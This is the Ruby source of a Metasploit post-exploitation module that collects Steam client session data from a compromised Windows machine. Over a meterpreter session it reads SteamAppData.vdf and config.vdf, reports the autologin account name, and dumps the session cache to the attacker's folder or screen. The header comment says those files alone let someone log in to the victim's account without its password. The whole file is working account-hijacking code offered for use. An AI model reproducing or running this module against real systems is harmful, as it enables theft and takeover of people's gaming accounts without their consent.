##
# $Id: steam.rb
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

##
# All that is needed to login to another Steam account is config.vdf,
# setting the AutoLoginUser to the proper username and RememberPassword
# to 1 in SteamAppData.vdf.
# Only tested on Win7 x64
#
# config.vdf , ContentCache element holds a K,V table of what appears
# to be UniqueID, Session. This is purely speculation as I have not
# reversed it to check. However the key is always unique to the account
# and the value changes whenever the account is logged out and then
# back in.
##

require 'msf/core'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Steam client session Collector.',
			'Description'    => %q{ This module will collect Steam session information from an
				account set to autologin. },
			'License'        => MSF_LICENSE,
			'Author'         => ['Nikolai Rusakov <nikolai.rusakov[at]gmail.com>'],
			'Version'        => '$Revision: 00001 $',
			'Platform'       => ['win'],
			'SessionTypes'   => ['meterpreter' ]
		))
		register_options(
			[
				OptPath.new('OUTPUT_FOLDER', [false, 'Where to dump the config files for use with
					steam. (if not specified it is printed to the screen)'])
			], self.class)

	end

	def run
		drive = session.fs.file.expand_path('%SystemDrive%')
		steamappdata = 'SteamAppData.vdf'
		steamconfig = 'config.vdf'
		u_rx = /AutoLoginUser\W*\"(.*)\"/

		case session.sys.config.sysinfo['Architecture']
		when /x64/
			progs = drive + '\\Program Files (x86)\\'
		when /x86/
			progs = drive + '\\Program Files\\'
		end
		path = progs + 'Steam\\config\\'

		print_status("Checking for Steam in: #{path}")

		begin
			session.fs.dir.entries(path)
		rescue ::Exception => e
			print_error(e.to_s)
			return
		end

		session.fs.dir.foreach(path) do |fdir|
			# SteamAppData.vdf contains the autologin and rememberpassword
			if fdir.eql? 'SteamAppData.vdf'
				print_status("Found SteamAppData, checking for RememberPassword=1.")
				sad = session.fs.file.open(path + steamappdata)
				sad_d = sad.read()
				sad.close()
				if sad_d =~ /RememberPassword\W*\"1\"/
					print_status("RememberPassword is set! Accountname is #{u_rx.match(sad_d)[1]}")
				end
				# config.vdf contains most importantly the ConnectCache K,V which appears to be
				# a session id that can be used to login to the account without credentials.
				scd = session.fs.file.open(path + steamconfig)
				scd_d = scd.read()
				scd.close()
				# If output folder is set, dump data there
				if datastore['OUTPUT_FOLDER']
					f = ::File.open(datastore['OUTPUT_FOLDER'] + '/config.vdf', 'wb')
					f.write(scd_d)
					f.close()
					f = ::File.open(datastore['OUTPUT_FOLDER'] + '/SteamAppData.vdf' ,'wb')
					f.write(sad_d)
					f.close()
					print_status("Files dumped to #{datastore['OUTPUT_FOLDER']}")
				# No output folder just dump config.vdf to the screen
				else
					print_line(scd_d)
					print_status("config.vdf dumped.")
				end
				return true
			end
		end
		print_status("Could not find steam config files.")
		return nil
	end

end
